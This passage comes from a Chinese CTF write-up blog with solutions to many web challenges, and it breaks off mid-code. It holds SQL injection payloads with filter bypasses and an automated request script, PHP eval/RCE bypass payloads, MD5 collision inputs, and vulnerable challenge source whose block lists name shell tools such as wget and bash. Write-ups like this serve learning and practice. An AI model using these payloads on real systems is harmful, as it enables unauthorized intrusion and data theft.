class="line">1&#x27; union select group_concat(flag) from flag#</span><br></pre></td></tr></table></figure><p></p><h5 id="ezhttp"><a class="anchor" href="#ezhttp">#</a> EzHttp</h5><p>这个题打开后难点在于代理这里你需要使用 via 学到新知识点，并且在添加 server 处如果有下划线的情况下需要使用把前面的下划线内容去掉</p><h5 id="n00b_upload"><a class="anchor" href="#n00b_upload">#</a> n00b_Upload</h5><p>这个题只是过滤了</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个题过滤了php但是我们依旧可以直接上传文件注意内容里面不要有php即可</span><br></pre></td></tr></table></figure><p></p><h5 id="easy_php"><a class="anchor" href="#easy_php">#</a> easy_php</h5><p>这个题注意下划线使用 [替代</p><h5 id="广东强网杯-2021-团队组love_pokemon"><a class="anchor" href="#广东强网杯-2021-团队组love_pokemon">#</a> [广东强网杯 2021 团队组] love_Pokemon</h5><p>使用 od 来得到他的 8 进制字符串，然后在使用 python 写一个脚本恢复原本的字符串即可</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dump = &quot;0000000 066146 063541 067173 057551 064541 073537 057557 067567 0000020 060537 057551 064556 066537 074151 062565 064542 063556 0000040 064143 067145 057547 064564 067141 064555 064555 005175 0000060&quot;</span><br><span class="line"></span><br><span class="line">b=&quot;&quot;</span><br><span class="line"></span><br><span class="line">octs = [(&quot;0o&quot; + n) for n in  dump.split(&quot; &quot;) if n]</span><br><span class="line"></span><br><span class="line">hexs = [int(n, 8) for n in octs]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for n in hexs:</span><br><span class="line"></span><br><span class="line">    if (len(hex(n)) &gt; 4):</span><br><span class="line"></span><br><span class="line">        swapped = hex(((n &lt;&lt; 8) | (n &gt;&gt; 8)) &amp; 0xFFFF)</span><br><span class="line"></span><br><span class="line">        result += swapped[2:].zfill(4)</span><br><span class="line"></span><br><span class="line">print(hexs)</span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(result))</span><br></pre></td></tr></table></figure><p></p><h5 id="uuctf-2022-新生赛ezsql"><a class="anchor" href="#uuctf-2022-新生赛ezsql">#</a> [UUCTF 2022 新生赛] ezsql</h5><blockquote><p>这个题就是一个 sql 注入但是过滤了 or 并且使用了逆反，导致你每次 sql 语句必须在逆反一下才行使用</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">首先构造语句1&#x27;)union select 1,2,3#然后逆转发现没有回显</span><br><span class="line">那我们构造1&#x27;)union select 1,2#后可以得到回显并且显示了pass在2那我们直接使用2来构造一个payload首先爆出数据库</span><br><span class="line">1&#x27;)union select 1,database()#得到数据库UUCTF</span><br><span class="line">在通过information来爆出表,需要注意的点是or被过滤了也代表了from逆转后的morf不能通过，那我们只有使用双写来达到绕过办法</span><br><span class="line">1&#x27;)union select 1,tabase_name frroon information_schema.tables where table_schema=database()#</span><br><span class="line">之后就得到了表名flag之后我们就要去获取他的字段</span><br><span class="line">1&#x27;)union select 1,column_name frronn information_schema.columns where column_schema=&#x27;flag&#x27;#</span><br><span class="line">然后就得到了字段为UUCTF之后直接爆字段内容</span><br><span class="line">1&#x27;)union select 1,UUCTF frroon flag#</span><br><span class="line">然后得到flag</span><br></pre></td></tr></table></figure><p></p><h5 id="fsctf-2023ez_php1"><a class="anchor" href="#fsctf-2023ez_php1">#</a> [FSCTF 2023]ez_php1</h5><blockquote><p>满足第一个 php 语法然后再去满足第二个语法，比较难的就是最后一个需要让 new class-&gt;b=&amp;new class-&gt;a</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Clazz</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">&#125;</span><br><span class="line">$c=new Clazz();</span><br><span class="line">$c-&gt;b=&amp;$c-&gt;a;</span><br><span class="line">echo serialize($c);</span><br></pre></td></tr></table></figure><p></p><h5 id="swpuctf-2023-秋季新生赛if_else"><a class="anchor" href="#swpuctf-2023-秋季新生赛if_else">#</a> [SWPUCTF 2023 秋季新生赛] If_else</h5><blockquote><p>没见过这么好的要求让我们自己来操作他的代码 if 判断，那就按照 sql 注入的套路去直接执行命令即可</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如让他的if变成if(1)system(&#x27;ls&#x27;);\*就能使用命令</span><br></pre></td></tr></table></figure><p></p><h5 id="fsctf-2023巴巴托斯"><a class="anchor" href="#fsctf-2023巴巴托斯">#</a> [FSCTF 2023] 巴巴托斯！</h5><blockquote><p>按照提示输入他的要求后发现没有其他显示在试试 /etc/passwd 发现能够查看到文件内容，那就很直接的目录查看或者使用 php 伪协议直接读取 flag.php 即可</p></blockquote><h5 id="swpu-2018simplephp"><a class="anchor" href="#swpu-2018simplephp">#</a> [SWPU 2018]SimplePHP</h5><blockquote><p>这个题讲究方法绕过可以利用 preg_match 的绕过比如回溯超出和 %02 截断<br>有坑点就是 flag 我找半天找不到太离谱了</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/cat%20/home/rceservice/flag</span><br></pre></td></tr></table></figure><p></p><h5 id="安洵杯-2019easy_web"><a class="anchor" href="#安洵杯-2019easy_web">#</a> [安洵杯 2019] easy_web</h5><blockquote><p>这个题考的是 md5 强绕过以及当很多函数被搬掉后该怎么办<br>打开就可以看到图片 base64 以及他的 url，这个 url 也有一串加密经过两次 base64 和一次 hex 解密后即可看到文件名，那试试把这个换成 index.php 查看一下源代码，发现可以把 base64 全部 copy 下来进行解密后看到源代码</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p></p><blockquote><p>这个代码先使用强比较绕过如下</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><p></p><blockquote><p>然后即可执行命令有两种方法可以执行，如 sort 和使用 \ 转义可能会好奇那个 \ 不是过滤了反斜杠了吗，对的但是我们传进去的样子是经过转义的这个是无法过滤的</p></blockquote><h5 id="nctf-2018easy_audit"><a class="anchor" href="#nctf-2018easy_audit">#</a> [NCTF 2018]Easy_Audit</h5><blockquote><p>数组绕过<br>$_REQUEST 变量覆盖<br>$_SERVER [‘QUERY_STRING’] 特性<br>注意绕过时的方法即可<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">_</mi><mi>R</mi><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mtext>有个特性就是当</mtext><mi>G</mi><mi>E</mi><mi>T</mi><mtext>和</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>有相同的变量时，匹配</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>的变量</mtext></mrow><annotation encoding="application/x-tex">\_REQUEST有个特性就是当GET和POST有相同的变量时，匹配POST的变量</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.99333em;vertical-align:-.31em"></span><span class="mord" style="margin-right:.02778em">_</span><span class="mord mathnormal" style="margin-right:.00773em">R</span><span class="mord mathnormal" style="margin-right:.05764em">E</span><span class="mord mathnormal">Q</span><span class="mord mathnormal" style="margin-right:.10903em">U</span><span class="mord mathnormal" style="margin-right:.05764em">E</span><span class="mord mathnormal" style="margin-right:.05764em">S</span><span class="mord mathnormal" style="margin-right:.13889em">T</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:.05764em">E</span><span class="mord mathnormal" style="margin-right:.13889em">T</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal" style="margin-right:.13889em">P</span><span class="mord mathnormal" style="margin-right:.02778em">O</span><span class="mord mathnormal" style="margin-right:.05764em">S</span><span class="mord mathnormal" style="margin-right:.13889em">T</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">匹</span><span class="mord cjk_fallback">配</span><span class="mord mathnormal" style="margin-right:.13889em">P</span><span class="mord mathnormal" style="margin-right:.02778em">O</span><span class="mord mathnormal" style="margin-right:.05764em">S</span><span class="mord mathnormal" style="margin-right:.13889em">T</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span></span></span></span>_SERVER [‘QUERY_STRING’] 匹配的是原始数据，就是没有 url 编码过的数据，所以可以使用 url 编码绕过</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">error_reporting(0);  </span><br><span class="line">if($_REQUEST)&#123;  </span><br><span class="line">    foreach ($_REQUEST as $key =&gt; $value) &#123;  </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if($_SERVER)&#123;  </span><br><span class="line">    if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(isset($_GET[&#x27;yulige&#x27;]))&#123;  </span><br><span class="line">    if(!(substr($_GET[&#x27;yulige&#x27;], 32) === md5($_GET[&#x27;yulige&#x27;])))&#123;         //日爆md5!!!!!!        die(&#x27;waf..&#x27;);  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        if(preg_match(&#x27;/nctfisfun$/&#x27;, $_GET[&#x27;nctf&#x27;]) &amp;&amp; $_GET[&#x27;nctf&#x27;] !== &#x27;nctfisfun&#x27;)&#123;            $getflag = file_get_contents($_GET[&#x27;flag&#x27;]);  </span><br><span class="line">        &#125;  </span><br><span class="line">        if(isset($getflag) &amp;&amp; $getflag === &#x27;ccc_liubi&#x27;)&#123;  </span><br><span class="line">            include &#x27;flag.php&#x27;;  </span><br><span class="line">            echo $flag;  </span><br><span class="line">        &#125;else die(&#x27;waf..&#x27;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><blockquote><p>使用</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?%79%75%6C%69%67%65[]=1&amp;%6E%63%74%66=%6E%63%74%66%69%73%66%75%6E%0a&amp;%66%6C%61%67=data://text/plain,ccc_liubi</span><br><span class="line">POST: yulige=1&amp;nctf=2&amp;flag=1</span><br></pre></td></tr></table></figure><p></p><h5 id="hnctf-2022-week1challenge__rce"><a class="anchor" href="#hnctf-2022-week1challenge__rce">#</a> [HNCTF 2022 Week1]Challenge__rce</h5><blockquote><p>这种题老套路，直接使用自增手法即可进行绕过得到 flag</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">error_reporting(0);  </span><br><span class="line">if (isset($_GET[&#x27;hint&#x27;])) &#123;    highlight_file(__FILE__);  </span><br><span class="line">&#125;  </span><br><span class="line">if (isset($_POST[&#x27;rce&#x27;])) &#123;    $rce = $_POST[&#x27;rce&#x27;];  </span><br><span class="line">    if (strlen($rce) &lt;= 120) &#123;  </span><br><span class="line">        if (is_string($rce)) &#123;  </span><br><span class="line">            if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;, $rce)) &#123;  </span><br><span class="line">                eval($rce);  </span><br><span class="line">            &#125; else &#123;  </span><br><span class="line">                echo(&quot;Are you hack me?&quot;);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            echo &quot;I want string!&quot;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        echo &quot;too long!&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><blockquote><p>传入：</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B</span><br><span class="line">使用的get的1和2进行连接的</span><br><span class="line">没有编码之前是</span><br><span class="line">rce=$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);</span><br></pre></td></tr></table></figure><p></p><h5 id="wustctf-2020颜值成绩查询"><a class="anchor" href="#wustctf-2020颜值成绩查询">#</a> [WUSTCTF 2020] 颜值成绩查询</h5><blockquote><p>过滤了 union 和空格，这个题使用大小写绕过即可</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/Union/**/select/**/1,2,3#使用这个可以查看到回显2，3</span><br><span class="line">0&#x27;/**/Union/**/select/**/1,2,database()#使用这个可以查看到数据库</span><br><span class="line">0&#x27;/**/Union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_tables.schema/**/where/**/table_schema=database()#</span><br><span class="line">0&#x27;/**/Union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_columns.schema/**/where/**/column_schema=&#x27;flag&#x27;#</span><br><span class="line">0&#x27;/**/Union/**/select/**/1,2,group_concat(flag,value)/**/from/**/flag#</span><br></pre></td></tr></table></figure><p></p><blockquote><p>也可以使用布尔盲注如</p></blockquote><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;ascii(substr(database(),1,1))=100#</span><br></pre></td></tr></table></figure><p></p><h5 id="swpuctf-2023-秋季新生赛rce-plus"><a class="anchor" href="#swpuctf-2023-秋季新生赛rce-plus">#</a> [SWPUCTF 2023 秋季新生赛] RCE-PLUS</h5><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">error_reporting(0);  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">function strCheck($cmd)  </span><br><span class="line">&#123;  </span><br><span class="line">    if(!preg_match(&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;, $cmd))&#123;  </span><br><span class="line">        return($cmd);  </span><br><span class="line">    &#125;  </span><br><span class="line">    else&#123;  </span><br><span class="line">        die(&quot;i hate this&quot;);        </span><br><span class="line">      &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];  </span><br><span class="line">strCheck($cmd);  </span><br><span class="line">shell_exec($cmd);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><p>这个 rce 非常简单但是需要注意这个 shell_exec 不会回显就只有使用 &gt; 符号去重定向这个内容再去访问</p><h5 id="swpuctf-2023-秋季新生赛一键连接"><a class="anchor" href="#swpuctf-2023-秋季新生赛一键连接">#</a> [SWPUCTF 2023 秋季新生赛] 一键连接！</h5><p>都使用数组绕过然后在使用一个 data://text/plain, 他的内容即可</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">error_reporting(0);  </span><br><span class="line">$md5_1 = $_GET[&#x27;md5_1&#x27;];  </span><br><span class="line">$md5_2 = $_GET[&#x27;md5_2&#x27;];  </span><br><span class="line">$sha1_1 = $_GET[&#x27;sha1_1&#x27;];  </span><br><span class="line">$sha1_2 = $_GET[&#x27;sha1_2&#x27;];  </span><br><span class="line">$new_player =$_GET[&#x27;new_player&#x27;];  </span><br><span class="line">if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) &#123;  </span><br><span class="line">    if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) &#123;  </span><br><span class="line">        if (file_get_contents($new_player) === &quot;Welcome to NSSCTF!!!&quot;) &#123;  </span><br><span class="line">            echo &quot;Congratulations~~~~~~~~~&quot;;  </span><br><span class="line">            echo &quot;试试need Antsword&lt;br/&gt;&quot;;  </span><br><span class="line">            @eval($_POST[&#x27;Nss&#x27;]);  </span><br><span class="line">        &#125;else&#123;  </span><br><span class="line">            echo &quot;可曾听过data协议?&quot;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        echo &quot;sha1又如何相等呢&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; else &#123;  </span><br><span class="line">    echo &quot;如何让md5值相等呢¿&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h5 id="护网杯-2018easy_tornado"><a class="anchor" href="#护网杯-2018easy_tornado">#</a> [护网杯 2018] easy_tornado</h5><p>查看 flag.txt 提供了 flag 的路径，然后 hint 提供了加密方法，看 url 可知道这个题的方法，然后在去 error?msg = 处来使用命令</p><h5 id="hnctf-2022-week2easy_sql"><a class="anchor" href="#hnctf-2022-week2easy_sql">#</a> [HNCTF 2022 WEEK2]easy_sql</h5><p>无字符漏洞</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;union/**/select/**/1,2,database()/**/where/**/&#x27;1</span><br><span class="line">Here is your want!</span><br><span class="line">ctf</span><br><span class="line"></span><br><span class="line">0&#x27;union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1</span><br><span class="line">Here is your want!</span><br><span class="line">ctf,ctftraining,ctftraining,ctftraining,mysql </span><br><span class="line"></span><br><span class="line">0&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1</span><br><span class="line">Here is your want!</span><br><span class="line">ccctttfff,flag,news,users,gtid_slave_pos </span><br><span class="line"></span><br><span class="line">0&#x27;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/&#x27;1</span><br><span class="line">Here is your want!</span><br><span class="line">1,NSSCTF&#123;da2750d9-7bb8-4470-9118-ccdfb258d822&#125; </span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了 and information_schema 空格</span><br></pre></td></tr></table></figure><p></p><p>学到一个思路当 #和 --+ 被过滤时我们可以使用 %00</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line"></span><br><span class="line">url=&#x27;http://node2.anna.nssctf.cn:28555/index.php&#x27;</span><br><span class="line">payload=f&quot;0&#x27;/**/union/**/select/**/1,2,group_concat(`2`)/**/from/**/(select/**/2/**/union/**/(select/**/*/**/from/**/ctftraining.flag))a/**/;&#123;parse.unquote(&#x27;%00&#x27;)&#125;&quot;</span><br><span class="line"></span><br><span class="line">data=&#123;&quot;id&quot;:payload&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">req=requests.post(url=url,data=data)</span><br><span class="line">print(req.text)</span><br></pre></td></tr></table></figure><p></p><h5 id="roarctf-2019online-proxy"><a class="anchor" href="#roarctf-2019online-proxy">#</a> [RoarCTF 2019]Online Proxy</h5><p>x-forwarded-for 的二次注入</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 